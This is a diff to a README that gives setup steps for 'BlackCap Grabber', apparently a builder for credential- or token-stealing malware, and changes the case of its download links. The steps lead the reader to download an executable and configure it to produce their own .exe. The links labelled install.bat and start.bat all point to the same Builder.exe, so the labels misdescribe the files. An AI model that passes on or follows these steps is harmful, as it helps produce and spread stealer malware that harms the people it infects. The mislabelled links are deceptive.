@@ -43,9 +43,9 @@ Love ❌ code ✅
 ## <a id="setup"></a> 📁 〢 Setting up BlackCap
 
 1. Install [Python](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe)
-2. Install [BlackCap Files](https://github.com/princeftw/BlackCap-Grabber/raw/main/builder.exe)
-3. Install all requirements [install.bat](https://github.com/princeftw/BlackCap-Grabber/raw/main/builder.exe)
-4. Click on start.bat [start.bat](https://github.com/princeftw/BlackCap-Grabber/raw/main/builder.exe)
+2. Install [BlackCap Files](https://github.com/princeftw/BlackCap-Grabber/raw/main/Builder.exe)
+3. Install all requirements [install.bat](https://github.com/princeftw/BlackCap-Grabber/raw/main/Builder.exe)
+4. Click on start.bat [start.bat](https://github.com/princeftw/BlackCap-Grabber/raw/main/Builder.exe)
 5. Complete the configuration
 6. You have your .exe file enjoy :)
 
